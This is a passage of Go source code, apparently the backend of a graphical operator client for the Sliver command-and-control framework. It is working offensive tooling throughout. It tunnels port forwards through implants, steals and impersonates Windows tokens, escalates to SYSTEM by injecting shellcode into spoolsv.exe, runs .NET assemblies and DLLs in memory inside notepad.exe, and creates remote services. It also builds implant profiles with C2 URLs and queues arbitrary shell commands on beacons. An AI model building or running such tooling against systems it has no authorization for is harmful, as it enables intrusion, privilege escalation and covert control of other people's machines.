		return fmt.Errorf("listen on 127.0.0.1:%d: %w", localPort, err)
	}
	ctx, cancel := context.WithCancel(a.ctx)
	a.advMu.Lock()
	a.portfwds[sessionID] = append(a.portfwds[sessionID], &portfwdHandle{
		localPort: localPort, remote: remote, cancel: cancel, listener: ln,
	})
	a.advMu.Unlock()

	go a.runPortfwd(ctx, client, sessionID, remote, ln)
	return nil
}

func (a *App) RemovePortForward(sessionID string, localPort int) error {
	a.advMu.Lock()
	defer a.advMu.Unlock()
	list := a.portfwds[sessionID]
	for i, h := range list {
		if h.localPort == localPort {
			h.listener.Close()
			h.cancel()
			a.portfwds[sessionID] = append(list[:i], list[i+1:]...)
			return nil
		}
	}
	return fmt.Errorf("no port forward on local port %d", localPort)
}

func (a *App) ListPortForwards(sessionID string) ([]PortForwardView, error) {
	a.advMu.Lock()
	defer a.advMu.Unlock()
	list := a.portfwds[sessionID]
	out := make([]PortForwardView, 0, len(list))
	for _, h := range list {
		out = append(out, PortForwardView{LocalPort: h.localPort, Remote: h.remote})
	}
	return out, nil
}

func (a *App) runPortfwd(ctx context.Context, client *sliverclient.Client, sessionID, remote string, ln net.Listener) {
	go func() { <-ctx.Done(); ln.Close() }()
	for {
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		go a.portfwdHandleConn(ctx, client, sessionID, remote, conn)
	}
}

func (a *App) portfwdHandleConn(ctx context.Context, client *sliverclient.Client, sessionID, remote string, conn net.Conn) {
	defer conn.Close()
	rpcTunnel, err := client.RPC.CreateTunnel(ctx, &sliverpb.Tunnel{SessionID: sessionID})
	if err != nil {
		return
	}
	tunnelID := rpcTunnel.GetTunnelID()
	stream, err := client.RPC.TunnelData(ctx)
	if err != nil {
		return
	}
	var seq uint64

	// First frame: tell the implant where to dial (see NOTE above).
	stream.Send(&sliverpb.TunnelData{TunnelID: tunnelID, Data: []byte(remote), Sequence: seq})
	seq++

	// stream -> local conn
	go func() {
		for {
			td, err := stream.Recv()
			if err != nil {
				conn.Close()
				return
			}
			if len(td.Data) > 0 {
				if _, werr := conn.Write(td.Data); werr != nil {
					return
				}
			}
			if td.Closed {
				conn.Close()
				return
			}
		}
	}()

	// local conn -> stream
	buf := make([]byte, 4096)
	for {
		n, rerr := conn.Read(buf)
		if n > 0 {
			if serr := stream.Send(&sliverpb.TunnelData{
				TunnelID: tunnelID,
				Data:     append([]byte(nil), buf[:n]...),
				Sequence: seq,
			}); serr != nil {
				break
			}
			seq++
		}
		if rerr != nil {
			break
		}
	}
	stream.Send(&sliverpb.TunnelData{TunnelID: tunnelID, Closed: true, Sequence: seq})
	stream.CloseSend()
	client.RPC.CloseTunnel(ctx, &sliverpb.Tunnel{TunnelID: tunnelID, SessionID: sessionID})
}

// ─── Token / Privilege (Windows) ───────────────────────────────────────────────

func (a *App) CurrentTokenOwner(sessionID string) (string, error) {
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}
	resp, err := client.RPC.CurrentTokenOwner(a.ctx, &sliverpb.CurrentTokenOwnerReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return "", err
	}
	return resp.Output, nil
}

// MakeToken creates a new logon session token from credentials (logon type 9 =
// NEW_CREDENTIALS, the sliver default).
func (a *App) MakeToken(sessionID, username, domain, password string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.MakeToken(a.ctx, &sliverpb.MakeTokenReq{
		Username:  username,
		Domain:    domain,
		Password:  password,
		LogonType: 9,
		Request:   &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) ImpersonateUser(sessionID, username string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Impersonate(a.ctx, &sliverpb.ImpersonateReq{
		Username: username,
		Request:  &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) RevToSelf(sessionID string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.RevToSelf(a.ctx, &sliverpb.RevToSelfReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// GetSystem migrates into a SYSTEM-owned process by spawning implant shellcode.
// It needs an implant config, which we pull from a saved implant profile.
func (a *App) GetSystem(sessionID, hostingProcess, profileName string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	cfg, err := a.profileConfig(profileName)
	if err != nil {
		return err
	}
	if hostingProcess == "" {
		hostingProcess = "spoolsv.exe"
	}
	_, err = client.RPC.GetSystem(a.ctx, &clientpb.GetSystemReq{
		HostingProcess: hostingProcess,
		Config:         cfg,
		Request:        &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── Assembly / Shellcode Execution ─────────────────────────────────────────────

type AssemblyResult struct {
	Output string `json:"output"`
	Error  string `json:"error,omitempty"`
}

// ExecuteAssembly runs a .NET assembly in-memory. Opens a native file picker for
// the assembly bytes.
// readLocalOrDialog reads a local file on the operator machine. If localPath is
// empty it opens a native file-open dialog instead. Lets console commands pass
// an explicit path (execute-assembly <path>) or fall back to a picker.
func (a *App) readLocalOrDialog(localPath, title string) ([]byte, error) {
	if localPath == "" {
		p, err := runtime.OpenFileDialog(a.ctx, runtime.OpenDialogOptions{Title: title})
		if err != nil || p == "" {
			return nil, fmt.Errorf("selection cancelled")
		}
		localPath = p
	}
	data, err := os.ReadFile(localPath)
	if err != nil {
		return nil, fmt.Errorf("read local file: %w", err)
	}
	return data, nil
}

func (a *App) ExecuteAssembly(sessionID, localPath, args string) AssemblyResult {
	client, err := a.requireClient()
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	data, err := a.readLocalOrDialog(localPath, "Select .NET assembly (.exe)")
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	resp, err := client.RPC.ExecuteAssembly(a.ctx, &sliverpb.ExecuteAssemblyReq{
		Assembly:  data,
		Arguments: strings.Fields(args),
		Process:   "notepad.exe",
		Request:   &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	return AssemblyResult{Output: string(resp.Output)}
}

// Sideload loads and runs a shared library / DLL in a sacrificial process.
func (a *App) Sideload(sessionID, localPath, args, entryPoint string) AssemblyResult {
	client, err := a.requireClient()
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	data, err := a.readLocalOrDialog(localPath, "Select DLL / shared library to sideload")
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	resp, err := client.RPC.Sideload(a.ctx, &sliverpb.SideloadReq{
		Data:        data,
		Args:        strings.Fields(args),
		EntryPoint:  entryPoint,
		ProcessName: "notepad.exe",
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	return AssemblyResult{Output: resp.Result}
}

// ─── Service Management (Windows) ───────────────────────────────────────────────

type ServiceView struct {
	Name        string `json:"name"`
	DisplayName string `json:"displayName"`
	Status      string `json:"status"`
}

// ListServices has no dedicated RPC in v1.7.3, so we fall back to an Execute of
// PowerShell Get-Service (CSV) and parse the output — same pattern as the Env
// and Registry tabs.
func (a *App) ListServices(sessionID string) ([]ServiceView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.Execute(a.ctx, &sliverpb.ExecuteReq{
		Path:    "powershell.exe",
		Args:    []string{"-NoProfile", "-Command", "Get-Service | Select-Object Name,DisplayName,Status | ConvertTo-Csv -NoTypeInformation"},
		Output:  true,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	out := []ServiceView{}
	lines := strings.Split(strings.ReplaceAll(string(resp.Stdout), "\r\n", "\n"), "\n")
	for i, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || i == 0 { // skip CSV header
			continue
		}
		cols := parseCSVLine(line)
		if len(cols) < 3 {
			continue
		}
		out = append(out, ServiceView{Name: cols[0], DisplayName: cols[1], Status: cols[2]})
	}
	return out, nil
}

// parseCSVLine parses a single simple RFC-4180-ish CSV row (double-quoted fields).
func parseCSVLine(line string) []string {
	var fields []string
	var sb strings.Builder
	inQuotes := false
	for i := 0; i < len(line); i++ {
		c := line[i]
		switch {
		case c == '"':
			if inQuotes && i+1 < len(line) && line[i+1] == '"' {
				sb.WriteByte('"')
				i++
			} else {
				inQuotes = !inQuotes
			}
		case c == ',' && !inQuotes:
			fields = append(fields, sb.String())
			sb.Reset()
		default:
			sb.WriteByte(c)
		}
	}
	fields = append(fields, sb.String())
	return fields
}

func (a *App) StartService(sessionID, hostname, serviceName, binPath string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.StartService(a.ctx, &sliverpb.StartServiceReq{
		ServiceName: serviceName,
		BinPath:     binPath,
		Hostname:    hostname,
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) StopService(sessionID, hostname, serviceName string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.StopService(a.ctx, &sliverpb.StopServiceReq{
		ServiceInfo: &sliverpb.ServiceInfoReq{ServiceName: serviceName, Hostname: hostname},
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) RemoveService(sessionID, hostname, serviceName string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.RemoveService(a.ctx, &sliverpb.RemoveServiceReq{
		ServiceInfo: &sliverpb.ServiceInfoReq{ServiceName: serviceName, Hostname: hostname},
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── Implant Profiles ───────────────────────────────────────────────────────────

type ProfileView struct {
	Name     string `json:"name"`
	GOOS     string `json:"goos"`
	GOARCH   string `json:"goarch"`
	Format   string `json:"format"`
	C2URL    string `json:"c2Url"`
	Debug    bool   `json:"debug"`
	Beacon   bool   `json:"beacon"`
	Interval int64  `json:"interval"`
	Jitter   int64  `json:"jitter"`
}

func (a *App) ListImplantProfiles() ([]ProfileView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.ImplantProfiles(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]ProfileView, 0, len(resp.Profiles))
	for _, p := range resp.Profiles {
		v := ProfileView{Name: p.Name}
		if p.Config != nil {
			v.GOOS = p.Config.GOOS
			v.GOARCH = p.Config.GOARCH
			v.Format = p.Config.Format.String()
			v.Debug = p.Config.Debug
			v.Beacon = p.Config.IsBeacon
			v.Interval = p.Config.BeaconInterval / int64(time.Second)
			v.Jitter = p.Config.BeaconJitter / int64(time.Second)
			if len(p.Config.C2) > 0 {
				v.C2URL = p.Config.C2[0].URL
			}
		}
		out = append(out, v)
	}
	return out, nil
}

// SaveImplantProfile persists a new implant profile (reuses the Generate form's
// request shape).
func (a *App) SaveImplantProfile(req GenerateRequest) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	if strings.TrimSpace(req.Name) == "" {
		return fmt.Errorf("profile name is required")
	}
	if strings.TrimSpace(req.C2URL) == "" {
		return fmt.Errorf("a C2 URL is required")
	}
	cfg := a.buildImplantConfig(req)
	_, err = client.RPC.SaveImplantProfile(a.ctx, &clientpb.ImplantProfile{
		Name:   req.Name,
		Config: cfg,
	})
	return err
}

// buildImplantConfig turns a GenerateRequest into a complete ImplantConfig with
// the correct output format, transport Include* flags derived from the C2 URL
// scheme, a valid HTTP C2 profile name, and beacon settings. Shared by
// GenerateImplant and SaveImplantProfile so profiles and builds stay consistent.
func (a *App) buildImplantConfig(req GenerateRequest) *clientpb.ImplantConfig {
	cfg := &clientpb.ImplantConfig{
		GOOS:             req.GOOS,
		GOARCH:           req.GOARCH,
		Debug:            req.Debug,
		Format:           formatFromString(req.Format),
		C2:               []*clientpb.ImplantC2{{URL: req.C2URL, Priority: 1}},
		ObfuscateSymbols: false,
	}
	if req.Beacon {
		cfg.IsBeacon = true
		interval := req.Interval
		if interval <= 0 {
			interval = 60
		}
		cfg.BeaconInterval = interval * int64(time.Second)
		cfg.BeaconJitter = req.Jitter * int64(time.Second)
	}
	if hc2, _ := a.firstHTTPC2ProfileName(); hc2 != "" {
		cfg.HTTPC2ConfigName = hc2
	} else {
		cfg.HTTPC2ConfigName = "default"
	}
	switch strings.ToLower(schemeOf(req.C2URL)) {
	case "http", "https":
		cfg.IncludeHTTP = true
	case "dns":
		cfg.IncludeDNS = true
	case "wg", "wireguard":
		cfg.IncludeWG = true
	case "tcp":
		cfg.IncludeTCP = true
	case "namedpipe":
		cfg.IncludeNamePipe = true
	default:
		cfg.IncludeMTLS = true
	}
	if req.GOOS != "windows" && cfg.Format == clientpb.OutputFormat_SERVICE {
		cfg.Format = clientpb.OutputFormat_EXECUTABLE
	}
	return cfg
}

func (a *App) DeleteImplantProfile(name string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.DeleteImplantProfile(a.ctx, &clientpb.DeleteReq{Name: name})
	return err
}


// ─── Beacon Task Execution ───────────────────────────────────────────────────
//
// Beacons use a task-queue model: commands are enqueued and the implant picks
// them up on its next check-in. Results come back asynchronously. We poll for
// task completion with a timeout.

type BeaconTaskResult struct {
	TaskID string `json:"taskId"`
	Status string `json:"status"` // "pending", "completed", "error"
	Stdout string `json:"stdout"`
	Stderr string `json:"stderr"`
	Error  string `json:"error,omitempty"`
}

// ExecuteBeaconCommand queues a shell command on a beacon and polls for the result.
func (a *App) ExecuteBeaconCommand(beaconID, command string) BeaconTaskResult {
	client, err := a.requireClient()
	if err != nil {
		return BeaconTaskResult{Error: err.Error()}
	}

	// Determine OS for shell path selection.
	beacons, _ := client.RPC.GetBeacons(a.ctx, &commonpb.Empty{})
	var beaconOS string
	if beacons != nil {
		for _, b := range beacons.Beacons {
			if b.ID == beaconID {
				beaconOS = strings.ToLower(b.OS)
				break
			}
		}
	}

	var exePath string
	var args []string
	if strings.Contains(beaconOS, "windows") {
		exePath = "cmd.exe"
		args = []string{"/c", command}
	} else {
		exePath = "/bin/sh"
		args = []string{"-c", command}
	}

	resp, err := client.RPC.Execute(a.ctx, &sliverpb.ExecuteReq{
		Path:    exePath,
		Args:    args,
		Output:  true,
		Request: &commonpb.Request{BeaconID: beaconID, Async: true},
	})
	if err != nil {
		return BeaconTaskResult{Error: err.Error()}
	}

	// For beacon mode, the Execute RPC returns immediately with a task ID in
	// resp.Response. We need to poll for the task result.
	if resp.Response != nil && resp.Response.TaskID != "" {
		taskID := resp.Response.TaskID
		return a.pollBeaconTask(beaconID, taskID)
	}

	// If the response came back directly (shouldn't happen for beacons, but handle it)
	return BeaconTaskResult{
		Status: "completed",
		Stdout: string(resp.Stdout),
		Stderr: string(resp.Stderr),
	}
}

// pollBeaconTask waits for a beacon task to complete, polling every 2 seconds up to 5 minutes.
func (a *App) pollBeaconTask(beaconID, taskID string) BeaconTaskResult {
	if taskID == "" {
		return BeaconTaskResult{Status: "pending", TaskID: "", Error: "task queued — will execute on next beacon check-in"}
	}

	client, err := a.requireClient()
	if err != nil {
		return BeaconTaskResult{TaskID: taskID, Status: "pending", Error: "disconnected while waiting"}
	}

	// Poll for up to 5 minutes (beacon intervals can be long)
	deadline := time.Now().Add(5 * time.Minute)
	for time.Now().Before(deadline) {
		tasks, err := client.RPC.GetBeaconTasks(a.ctx, &clientpb.Beacon{ID: beaconID})
		if err != nil {
			return BeaconTaskResult{TaskID: taskID, Status: "pending", Error: fmt.Sprintf("poll error: %v — task still queued", err)}
		}
		for _, t := range tasks.Tasks {
			if t.ID == taskID {
				if t.State == "completed" {
					// Try to unmarshal the response as an Execute response
					stdout, stderr := parseExecuteResponse(t.Response)
					return BeaconTaskResult{
						TaskID: taskID,
						Status: "completed",
						Stdout: stdout,
						Stderr: stderr,
					}
				}
				if t.State == "failed" || t.State == "canceled" {
					return BeaconTaskResult{
						TaskID: taskID,
						Status: "error",
						Error:  fmt.Sprintf("task %s", t.State),
					}
				}
			}
		}
		time.Sleep(2 * time.Second)
	}

	return BeaconTaskResult{
		TaskID: taskID,
		Status: "pending",
		Error:  "task still pending — beacon has not checked in yet. It will execute on the next check-in.",
	}
}

// parseExecuteResponse tries to extract stdout/stderr from a serialized Execute
// protobuf response. Falls back to raw string if parsing fails.
func parseExecuteResponse(data []byte) (stdout, stderr string) {
	if len(data) == 0 {
		return "(no output)", ""
	}
	// Try protobuf unmarshal using proto.Unmarshal
	var execResp sliverpb.Execute
	if err := proto.Unmarshal(data, &execResp); err == nil {
		return string(execResp.Stdout), string(execResp.Stderr)
	}
	// Fallback: return raw bytes as string
	return string(data), ""
}

// ExecuteBeaconCommandAsync queues a command on a beacon and polls for the result
// with a configurable timeout. This is the primary method the frontend uses.
// It polls every 2s for up to 5 minutes waiting for the beacon to check in.
func (a *App) ExecuteBeaconCommandAsync(beaconID, command string) BeaconTaskResult {
	client, err := a.requireClient()
	if err != nil {
		return BeaconTaskResult{Error: err.Error()}
	}

	beacons, _ := client.RPC.GetBeacons(a.ctx, &commonpb.Empty{})
	var beaconOS string
	if beacons != nil {
		for _, b := range beacons.Beacons {
			if b.ID == beaconID {
				beaconOS = strings.ToLower(b.OS)
				break
			}
		}
	}

	var exePath string
	var args []string
	if strings.Contains(beaconOS, "windows") {
		exePath = "cmd.exe"
		args = []string{"/c", command}
	} else {
		exePath = "/bin/sh"
		args = []string{"-c", command}
	}

	resp, err := client.RPC.Execute(a.ctx, &sliverpb.ExecuteReq{
		Path:    exePath,
		Args:    args,
		Output:  true,
		Request: &commonpb.Request{BeaconID: beaconID, Async: true},
	})
	if err != nil {
		return BeaconTaskResult{Error: err.Error()}
	}

	taskID := ""
	if resp.Response != nil {
		taskID = resp.Response.TaskID
	}

	// Return immediately with the task ID. The frontend polls GetBeaconTasks for
	// the result so the console never blocks waiting for a beacon check-in.
	if taskID != "" {
		return BeaconTaskResult{Status: "pending", TaskID: taskID}
	}

	// No task ID means the response came back directly (rare for beacons).
	if resp.Stdout != nil || resp.Stderr != nil {
		return BeaconTaskResult{
			Status: "completed",
			Stdout: string(resp.Stdout),
			Stderr: string(resp.Stderr),
		}
	}

	return BeaconTaskResult{Status: "pending", Error: "command queued - waiting for beacon check-in"}
}

// GetBeaconTaskResults retrieves all task results for a beacon.
type BeaconTaskView struct {
	ID          string `json:"id"`
	State       string `json:"state"`
	Description string `json:"description"`
	CreatedAt   string `json:"createdAt"`
	CompletedAt string `json:"completedAt"`
	Response    string `json:"response"`
}

func (a *App) GetBeaconTasks(beaconID string) ([]BeaconTaskView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.GetBeaconTasks(a.ctx, &clientpb.Beacon{ID: beaconID})
	if err != nil {
		return nil, err
	}
	out := make([]BeaconTaskView, 0, len(resp.Tasks))
	for _, t := range resp.Tasks {
		created := ""
		if t.CreatedAt > 0 {
			created = time.Unix(t.CreatedAt, 0).Format("15:04:05")
		}
		completed := ""
		if t.CompletedAt > 0 {
			completed = time.Unix(t.CompletedAt, 0).Format("15:04:05")
		}
		// Parse the response bytes into readable text
		response := ""
		if len(t.Response) > 0 && t.State == "completed" {
			stdout, stderr := parseExecuteResponse(t.Response)
			response = stdout
			if stderr != "" {
				response += "\n[stderr] " + stderr
			}
		} else if len(t.Response) > 0 {
			response = string(t.Response)
		}
		out = append(out, BeaconTaskView{
			ID:          t.ID,
			State:       t.State,
			Description: t.Description,
			CreatedAt:   created,
			CompletedAt: completed,
			Response:    response,
		})
	}
	return out, nil
}

// GetBeaconTaskResult fetches a single beacon task's full content. GetBeaconTasks
// only returns task summaries (no Response body) — the actual output requires the
// GetBeaconTaskContent RPC. The frontend poller calls this to display results.
func (a *App) GetBeaconTaskResult(taskID string) (BeaconTaskView, error) {
	client, err := a.requireClient()
	if err != nil {
		return BeaconTaskView{}, err
	}
	t, err := client.RPC.GetBeaconTaskContent(a.ctx, &clientpb.BeaconTask{ID: taskID})
	if err != nil {
		return BeaconTaskView{}, err
	}
	v := BeaconTaskView{ID: t.ID, State: t.State, Description: t.Description}
	if t.CreatedAt > 0 {
		v.CreatedAt = time.Unix(t.CreatedAt, 0).Format("15:04:05")
	}
	if t.CompletedAt > 0 {
		v.CompletedAt = time.Unix(t.CompletedAt, 0).Format("15:04:05")
	}
	if len(t.Response) > 0 {
		stdout, stderr := parseExecuteResponse(t.Response)
		v.Response = stdout
		if stderr != "" {
			v.Response += "\n[stderr] " + stderr
		}
	}
	return v, nil
}
